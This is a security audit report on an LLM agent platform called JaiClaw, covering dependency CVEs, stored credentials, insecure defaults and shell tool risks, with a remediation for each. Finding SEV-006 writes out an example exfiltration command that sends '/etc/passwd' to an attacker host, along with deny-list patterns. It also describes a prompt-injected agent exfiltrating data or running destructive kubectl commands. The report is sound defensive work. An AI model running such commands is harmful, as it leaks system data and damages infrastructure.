# JaiClaw Security Scan Report

**Date:** 2026-05-14
**Scope:** Full codebase — 42+ modules (`core/`, `channels/`, `extensions/`, `tools/`, `apps/`)
**Scanner:** Manual static analysis + OWASP dependency-check-maven

## Executive Summary

The codebase demonstrates strong security fundamentals: timing-safe API key comparison, SSRF protection, workspace boundary enforcement, path traversal guards, and tenant context propagation are all **on by default**. However, the scan identified **8 Spring AI CVEs** (including CVSS 8.8 SQL injection), **live API keys in local `.env` files** (gitignored but present on disk), webhook signature verification that defaults to off, and an unrestricted kubectl policy. The `none` security mode lacks the security headers applied to the other modes. Overall posture is good for the current maturity stage, with 8 actionable findings requiring attention.

## Summary Statistics

| Severity | Count |
|----------|-------|
| Critical |   2   |
| High     |   5   |
| Medium   |   6   |
| Low      |   3   |
| Info     |   9   |

**Total findings:** 25 (16 issues + 9 positive observations)

---

## Findings

### [SEV-001] Spring AI 1.1.4 — 8 Known CVEs — CRITICAL

**Category:** A06:2021 — Vulnerable and Outdated Components
**Affected:** `pom.xml:60` — `<spring-ai.version>1.1.4</spring-ai.version>`
**Description:** OWASP dependency-check identified 8 CVEs in `spring-ai-model-1.1.4.jar`:

| CVE | CVSS | Description |
|-----|------|-------------|
| CVE-2026-40978 | 8.8 | SQL injection in CosmosDBVectorStore via crafted document IDs |
| CVE-2026-41705 | 8.6 | Filter-expression injection in MilvusVectorStore |
| CVE-2026-40967 | 8.6 | FilterExpressionConverter implementations lack input sanitization |
| CVE-2026-41713 | 8.2 | Conversation memory injection — stored input interpreted by model |
| CVE-2026-41712 | 7.5 | Chat memory default exposes data between users |
| CVE-2026-40980 | 6.5 | Malicious PDF triggers unreasonable memory allocation |
| CVE-2026-40979 | 6.1 | Shared environment can expose ONNX model |
| CVE-2026-40966 | 5.9 | Conversation isolation bypass — exfiltrate sensitive memory |

**Risk:** The conversation memory CVEs (CVE-2026-41713, CVE-2026-41712, CVE-2026-40966) are particularly dangerous for a multi-tenant agent platform — one tenant could potentially read another tenant's conversation history.
**Remediation:** Upgrade `spring-ai.version` to `1.1.5` or later. Verify compatibility with Embabel 0.3.5.

---

### [SEV-002] Live API Keys in Local `.env` Files — CRITICAL

**Category:** A07:2021 — Identification and Authentication Failures
**Affected:**
- `docker-compose/.env:7` — Anthropic API key (`sk-ant-api03-...`)
- `docker-compose/.env:13` — Google Gemini API key
- `docker-compose/.env:22,27` — MiniMax API keys
- `docker-compose/.env:53` — JaiClaw API key
- `docker-compose/.env:60` — Telegram bot token
- `maven-central-deploy/.env:3-4` — Maven Central deploy credentials
- `maven-central-deploy/.env:8` — GPG passphrase

**Description:** Multiple `.env` files contain live, working API keys and deployment credentials. Files are gitignored but present on the local filesystem.
**Risk:** Accidental sharing via backup, archive, or filesystem access. Maven Central credentials could be used to publish malicious artifacts.
**Remediation:**
1. Rotate all exposed API keys immediately
2. Use OS keychain or a secrets manager instead of `.env` files
3. Add `*.env` as a catch-all pattern to `.gitignore`
4. Install `git-secrets` pre-commit hook

---

### [SEV-003] Webhook Signature Verification Defaults to OFF — HIGH

**Category:** A01:2021 — Broken Access Control
**Affected:**
- `core/jaiclaw-config/src/main/java/io/jaiclaw/config/ChannelsProperties.java` — `verifySignature` (Slack), `verifyWebhook` (Telegram) default to `false`
- `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java:100` — `/webhook/**` is `permitAll()`

**Description:** All webhook endpoints bypass authentication (`permitAll`), relying on channel-specific signature verification. But signature verification defaults to `false` for both Slack and Telegram. Only the `security-hardened` profile enables them.
**Risk:** Anyone who discovers the webhook URL can inject messages into channels, impersonating legitimate platform callbacks.
**Remediation:** Default `verifySignature` and `verifyWebhook` to `true` when the corresponding signing secret/token is configured. Log a warning if signature verification is off and a signing secret exists.

---

### [SEV-004] Kubectl Policy Defaults to "unrestricted" — HIGH

**Category:** A03:2021 — Injection / A05:2021 — Security Misconfiguration
**Affected:**
- `core/jaiclaw-config/src/main/java/io/jaiclaw/config/ToolsProperties.java:64-65` — `KubectlPolicyProperties.DEFAULT` uses `"unrestricted"`
- `core/jaiclaw-tools/src/main/java/io/jaiclaw/tools/exec/KubectlPolicyConfig.java:26-28` — same

**Description:** The kubectl tool policy defaults to `unrestricted` with no verb blocklist. All kubectl verbs including `delete`, `exec`, and `apply` are allowed.
**Risk:** An LLM agent could execute destructive kubectl commands (`kubectl delete namespace production`, `kubectl exec` into pods) without restriction.
**Remediation:**
```java
public static final KubectlPolicyProperties DEFAULT = new KubectlPolicyProperties(
        "read-only", List.of("get", "describe", "logs", "top"), List.of()
);
```

---

### [SEV-005] `none` Security Mode Lacks Headers and Allows All — HIGH

**Category:** A01:2021 — Broken Access Control
**Affected:**
- `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java:184-196` — `NoneSecurityConfiguration`
- 6 example apps default to `mode: none`

**Description:** The `none` mode disables authentication, CSRF, and skips security headers (HSTS, X-Frame-Options, Referrer-Policy). It doesn't even call `configureSecurityHeaders()`.
**Risk:** If accidentally deployed to production (or if an example app is used as a template), all endpoints are publicly accessible without any security protections.
**Remediation:**
1. Add `configureSecurityHeaders(http)` to the `none` mode filter chain
2. Log a startup warning banner (already present via `SecurityModeLogger`)
3. Consider gating `none` mode behind a `spring.profiles.active` check

---

### [SEV-006] Shell Command Injection Residual Risk — HIGH

**Category:** A03:2021 — Injection
**Affected:**
- `core/jaiclaw-tools/src/main/java/io/jaiclaw/tools/builtin/ShellExecTool.java:84` — `sh -c` execution
- `core/jaiclaw-tools/src/main/java/io/jaiclaw/tools/builtin/WhitelistedCommandTool.java:107`
- `extensions/jaiclaw-tools-k8s/src/main/java/io/jaiclaw/tools/k8s/KubectlExecTool.java:84`

**Description:** Shell tools pass commands through `sh -c`. The `deny-dangerous` policy blocks common metacharacters (`; | && || $( > < &`) and patterns (`rm -rf /`, `mkfs`), plus `SafeProcessEnvironment` strips secrets from env. However, exfiltration via URL embedding (e.g., `curl http://attacker.com/$(cat /etc/passwd)`) or other creative bypass vectors remain possible.
**Risk:** An LLM agent manipulated via prompt injection could exfiltrate data or execute unexpected commands.
**Remediation:**
1. Block `$()` and backtick patterns more aggressively in `CommandPolicy`
2. Consider switching to `allow-list-only` policy for production deployments
3. Document the security posture of each policy level

---

### [SEV-007] Maven Central Credentials in Local File — HIGH

**Category:** A07:2021 — Identification and Authentication Failures
**Affected:** `maven-central-deploy/.env:3-4,8` — Contains `CENTRAL_TOKEN_USERNAME`, `CENTRAL_TOKEN_PASSWORD`, `GPG_PASSPHRASE`
**Description:** Real Maven Central deploy credentials and GPG passphrase stored in a local `.env` file. Though gitignored, these enable publishing to Maven Central.
**Risk:** If filesystem is compromised, attacker can publish malicious JaiClaw artifacts to Maven Central.
**Remediation:** Move credentials to OS keychain or `~/.m2/settings.xml` (standard Maven approach with encrypted server passwords). Delete the `.env` file after migration.

---

### [SEV-008] No Content-Security-Policy Header — MEDIUM

**Category:** A05:2021 — Security Misconfiguration
**Affected:** `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java:57-67` — `configureSecurityHeaders()`
**Description:** The method configures X-Content-Type-Options, X-Frame-Options, Referrer-Policy, and HSTS, but omits Content-Security-Policy and Permissions-Policy headers.
**Risk:** Without CSP, the gateway API responses are more susceptible to XSS if any endpoint returns HTML content. The canvas module (separate port 18793) is a particular concern since it serves generated HTML.
**Remediation:** Add a baseline CSP:
```java
.contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
```
For the canvas module, a more permissive CSP may be needed since it serves generated HTML.

---

### [SEV-009] Rate Limiting Disabled by Default — MEDIUM

**Category:** A04:2021 — Insecure Design
**Affected:** `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityProperties.java:108` — `RateLimitProperties()` constructor sets `enabled=false`
**Description:** Rate limiting requires explicit opt-in via `jaiclaw.security.rate-limit.enabled=true`. No rate limiting is configured in the gateway-app `application.yml`.
**Risk:** API endpoints can be hammered without throttling, enabling brute-force attacks on API keys and resource exhaustion.
**Remediation:** Enable rate limiting by default in the gateway-app `application.yml`:
```yaml
jaiclaw:
  security:
    rate-limit:
      enabled: true
      max-requests-per-window: 60
      window-seconds: 60
```

---

### [SEV-010] No Method-Level Authorization in JWT Mode — MEDIUM

**Category:** A01:2021 — Broken Access Control
**Affected:** Entire codebase — no `@PreAuthorize`, `@Secured`, or `@RolesAllowed` annotations found
**Description:** JWT mode extracts roles and maps them to tool profiles via `RoleToolProfileResolver`, but this only gates tool availability. All authenticated endpoints (API, MCP) are accessible to any valid JWT holder regardless of role.
**Risk:** A user with a `viewer` role could access administrative API endpoints or invoke MCP tools they shouldn't have access to.
**Remediation:** Add `@PreAuthorize` annotations to sensitive controller methods, particularly MCP tool execution endpoints and broadcast messaging.

---

### [SEV-011] MCP Messaging Allows Cross-Talk Without Authorization — MEDIUM

**Category:** A01:2021 — Broken Access Control
**Affected:** `extensions/jaiclaw-messaging/src/main/java/io/jaiclaw/messaging/mcp/MessagingMcpToolProvider.java:115,211`
**Description:** The `send_message` and `broadcast_message` MCP tools allow sending messages to arbitrary recipients on any allowed channel. There is a channel allowlist but no per-recipient authorization.
**Risk:** An authenticated MCP client could send messages to arbitrary recipients, enabling spam or social engineering.
**Remediation:** Add recipient authorization or per-channel rate limits on MCP message sending.

---

### [SEV-012] CSRF Disabled Globally — MEDIUM

**Category:** A05:2021 — Security Misconfiguration
**Affected:** `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java:96,162,193`
**Description:** CSRF protection is disabled across all three security modes.
**Risk:** Acceptable for stateless REST APIs using API keys/JWT Bearer tokens. However, the `none` mode combined with disabled CSRF means any browser-based form can POST to the API.
**Remediation:** No immediate action needed for api-key/jwt modes. For `none` mode, consider re-enabling CSRF or adding a warning that it's for local development only.

---

### [SEV-013] Teams `skipJwtValidation` Flag — MEDIUM

**Category:** A05:2021 — Security Misconfiguration
**Affected:** `apps/jaiclaw-gateway-app/src/main/resources/application.yml:156`
**Description:** `skip-jwt-validation: ${TEAMS_SKIP_JWT_VALIDATION:false}` — defaults to `false` (good), but the env var allows bypassing all Teams webhook JWT verification.
**Risk:** If set to `true` in production, anyone can inject Teams webhook payloads.
**Remediation:** Log a warning when this flag is set to `true`. Consider removing it entirely and requiring proper JWT validation.

---

### [SEV-014] Voice Call Thread Pools Lack Tenant Propagation — LOW

**Category:** Multi-Tenancy Isolation
**Affected:**
- `extensions/jaiclaw-voice-call/src/main/java/io/jaiclaw/voicecall/store/JsonlCallStore.java:36`
- `extensions/jaiclaw-voice-call/src/main/java/io/jaiclaw/voicecall/manager/CallManager.java:48`

**Description:** Both components create thread pools (`Executors.newSingleThreadExecutor()` and `Executors.newScheduledThreadPool()`) without `TenantContextPropagator` wrapping.
**Risk:** Voice call operations dispatched to these pools lose tenant context, which could cause data to be written without proper tenant isolation.
**Remediation:** Wrap submitted tasks with `TenantContextPropagator.wrap()`.

---

### [SEV-015] Default Bind Address 0.0.0.0 in Shell Onboarding — LOW

**Category:** A05:2021 — Security Misconfiguration
**Affected:** `apps/jaiclaw-shell/src/main/java/io/jaiclaw/shell/commands/setup/OnboardResult.java:29`
**Description:** The onboarding wizard defaults to binding on all interfaces (`0.0.0.0`).
**Risk:** Appropriate for containers but could expose the gateway on public interfaces in development.
**Remediation:** Default to `127.0.0.1` for local development; document that `0.0.0.0` is needed for container deployments.

---

### [SEV-016] No Actuator Endpoint Configuration — LOW

**Category:** A05:2021 — Security Misconfiguration
**Affected:** No actuator config found in application YAML files
**Description:** If Spring Actuator is on the classpath, endpoints would be subject to the security filter chain. The `anyRequest().denyAll()` rule in api-key/jwt modes would block actuator endpoints.
**Risk:** Low — `denyAll()` prevents unauthorized access. However, if actuator is needed for monitoring, explicit path configuration should be added.
**Remediation:** If actuator is used, explicitly configure allowed endpoints and add them to the security filter chain's `permitAll()` or `authenticated()` rules.

---

## Strengths

- **Timing-safe API key comparison** defaults to `true` (`MessageDigest.isEqual`)
- **SSRF protection** defaults to `true` — `SsrfGuard` blocks private/internal IP addresses
- **Workspace boundary** defaults to `true` — code tools cannot escape the workspace directory
- **Canvas path traversal protection** — both `writeHtml()` and `readHtml()` validate paths
- **Tenant context propagation** — `AgentRuntime` uses `TenantContextPropagator.wrap()` for async work
- **Session tenant isolation** — `SessionManager` properly prefixes, validates, and filters by tenant
- **`SafeProcessEnvironment`** strips all non-essential env vars from spawned processes (blocks secret leakage)
- **JWT secret minimum length** enforced (32 characters for HMAC-SHA256)
- **`anyRequest().denyAll()`** in api-key and JWT modes — unknown paths are denied
- **HTTP security headers** — HSTS, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy configured
- **No Java deserialization** — all data handling uses Jackson JSON
- **No XML processing** — no XXE risk
- **Application YAML uses env var placeholders** — no hardcoded secrets in tracked source

## Recommended Next Steps

1. **Upgrade Spring AI to 1.1.5+** — addresses 8 CVEs including conversation memory isolation bypass (critical for multi-tenant)
2. **Rotate all API keys** in `docker-compose/.env` and `maven-central-deploy/.env`; migrate to OS keychain
3. **Default webhook verification to ON** when signing secrets are configured (Slack, Telegram)
4. **Default kubectl policy to `read-only`** instead of `unrestricted`
5. **Enable rate limiting** in gateway-app `application.yml` by default
6. **Add CSP header** to `configureSecurityHeaders()`
7. **Add security headers to `none` mode** filter chain
8. **Add method-level `@PreAuthorize`** for sensitive endpoints in JWT mode
9. **Wrap voice-call thread pools** with `TenantContextPropagator`
10. **Document shell execution policy** threat model — what `deny-dangerous` does and doesn't protect against
